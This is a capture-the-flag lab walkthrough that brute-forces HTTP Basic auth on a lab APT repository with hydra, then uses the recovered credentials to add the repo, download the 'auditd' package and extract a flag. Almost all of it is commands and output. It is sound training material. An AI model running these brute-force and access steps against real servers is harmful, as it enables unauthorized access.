# apt-repo-protected-service

#### Objective:  Figure out the credentials for APT server, get the package and retrieve the flag

- A flag is hidden in "auditd" package which is hosted on a protected APT repository on the same network.

----

```sh
root@attackdefense:~# nmap -sV 192.155.77.3
Starting Nmap 7.70 ( https://nmap.org ) at 2020-06-12 11:03 UTC
Nmap scan report for 2i50c47iuyivnltasvg1zbnxs.temp-network_a-155-77 (192.155.77.3)
Host is up (0.000027s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
MAC Address: 02:42:C0:9B:4D:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.65 seconds
root@attackdefense:~# 
```

```sh
root@attackdefense:~# curl http://192.155.77.3
<html>
<head><title>401 Authorization Required</title></head>
<body bgcolor="white">
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
root@attackdefense:~# 
```

```sh
root@attackdefense:~# curl -v http://192.155.77.3
* Expire in 0 ms for 6 (transfer 0x55941800bdd0)
*   Trying 192.155.77.3...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x55941800bdd0)
* Connected to 192.155.77.3 (192.155.77.3) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.155.77.3
> User-Agent: curl/7.64.0
> Accept: */*
> 
< HTTP/1.1 401 Unauthorized
< Server: nginx/1.14.0 (Ubuntu)
< Date: Fri, 12 Jun 2020 11:06:05 GMT
< Content-Type: text/html
< Content-Length: 204
< Connection: keep-alive
< WWW-Authenticate: Basic realm="Registry realm"
< 
<html>
<head><title>401 Authorization Required</title></head>
<body bgcolor="white">
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
* Connection #0 to host 192.155.77.3 left intact
root@attackdefense:~# 
```

```sh
root@attackdefense:~# hydra -l admin -P wordlists/100-common-passwords.txt -f 192.155.77.3 http-get /
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-12 11:14:28
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking http-get://192.155.77.3:80/
[80][http-get] host: 192.155.77.3   login: admin   password: xbox360
[STATUS] attack finished for 192.155.77.3 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-12 11:14:29
root@attackdefense:~# 
```

```sh
root@attackdefense:~# curl -u admin:xbox360 http://192.155.77.3/     
<html> <head> Local APT Repo </head> <body> Use this APT server for local network. Repo path: http://<IP>/repo/   </body> </html>
root@attackdefense:~# 
```

```sh
root@attackdefense:~# curl -u admin:xbox360 http://192.155.77.3/repo/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /repo</title>
 </head>
 <body>
<h1>Index of /repo</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="InRelease">InRelease</a></td><td align="right">2019-06-09 09:26  </td><td align="right">1.9K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="KEY.gpg">KEY.gpg</a></td><td align="right">2019-06-09 07:42  </td><td align="right">2.4K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="Packages">Packages</a></td><td align="right">2019-06-09 09:26  </td><td align="right"> 24K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/compressed.gif" alt="[   ]"></td><td><a href="Packages.gz">Packages.gz</a></td><td align="right">2019-06-09 09:26  </td><td align="right">9.0K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="Release">Release</a></td><td align="right">2019-06-09 09:26  </td><td align="right">1.2K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="Release.gpg">Release.gpg</a></td><td align="right">2019-06-09 09:26  </td><td align="right">703 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="amd64/">amd64/</a></td><td align="right">2019-06-09 09:26  </td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.29 (Ubuntu) Server at 192.175.237.3 Port 80</address>
</body></html>
root@attackdefense:~# 
```

```sh
root@attackdefense:~# echo "deb http://admin:xbox360@192.155.77.3/repo/ /" > /etc/apt/sources.list.d/internal.list
```

```sh
root@attackdefense:~# wget -q -O - http://admin:xbox360@192.155.77.3/repo/KEY.gpg | apt-key add -
OK
root@attackdefense:~# 
```

```sh
root@attackdefense:~# apt update
Get:1 http://192.155.77.3/repo  InRelease [1956 B]
Get:2 http://192.155.77.3/repo  Packages [9206 B]
Fetched 11.2 kB in 0s (87.8 kB/s)  
Reading package lists... Done
Building dependency tree       
Reading state information... Done
3 packages can be upgraded. Run 'apt list --upgradable' to see them.
N: Usage of apt_auth.conf(5) should be preferred over embedding login information directly in the sources.list(5) entry for 'http://192.155.77.3/repo'
root@attackdefense:~# 
```

```sh
root@attackdefense:~# apt clean 
```

```sh
root@attackdefense:~# apt install -d auditd
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libargon2-0 libdns-export1100
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  libauparse0
Suggested packages:
  audispd-plugins
The following NEW packages will be installed:
  auditd libauparse0
0 upgraded, 2 newly installed, 0 to remove and 3 not upgraded.
Need to get 242 kB of archives.
After this operation, 803 kB of additional disk space will be used.
Do you want to continue? [Y/n] 
Get:1 http://192.155.77.3/repo  libauparse0 1:2.8.2-1ubuntu1 [48.6 kB]
Get:2 http://192.155.77.3/repo  auditd 1:2.8.2-1ubuntu1 [194 kB]
Fetched 242 kB in 0s (0 B/s)    
Download complete and in download only mode
root@attackdefense:~# 
```

```sh
root@attackdefense:~# cd /var/cache/apt/archives/
root@attackdefense:/var/cache/apt/archives# ls -l
total 244
-rw-r--r-- 1 root root 193732 Jun  9  2019 auditd_1%3a2.8.2-1ubuntu1_amd64.deb
-rw-r--r-- 1 root root  48608 Jun  9  2019 libauparse0_1%3a2.8.2-1ubuntu1_amd64.deb
-rw-r----- 1 root root      0 Jan 10  2018 lock
drwx------ 1 _apt root   4096 Jun 12 11:20 partial
root@attackdefense:/var/cache/apt/archives# 
```

```sh
root@attackdefense:/var/cache/apt/archives# mkdir extracted
```

```sh
root@attackdefense:/var/cache/apt/archives# dpkg-deb -R auditd_1%3a2.8.2-1ubuntu1_amd64.deb extracted/
```

```sh
root@attackdefense:/var/cache/apt/archives# cd extracted/
root@attackdefense:/var/cache/apt/archives/extracted# ls -l
total 24
drwxr-xr-x 2 root root 4096 Feb  7  2018 DEBIAN
drwxr-xr-x 6 root root 4096 Jun  9  2019 etc
drwxr-xr-x 3 root root 4096 Jun  9  2019 lib
drwxr-xr-x 2 root root 4096 Feb  7  2018 sbin
drwxr-xr-x 4 root root 4096 Feb  7  2018 usr
drwxr-xr-x 3 root root 4096 Feb  7  2018 var
root@attackdefense:/var/cache/apt/archives/extracted# 
```

```sh
root@attackdefense:/var/cache/apt/archives/extracted# find . -name "*flag*"
./lib/flag.txt
root@attackdefense:/var/cache/apt/archives/extracted# 
```

```sh
root@attackdefense:/var/cache/apt/archives/extracted# cat ./lib/flag.txt 
e400cdc6e01c1cb93e32d202c7406d92
root@attackdefense:/var/cache/apt/archives/extracted# 
```

----

EOF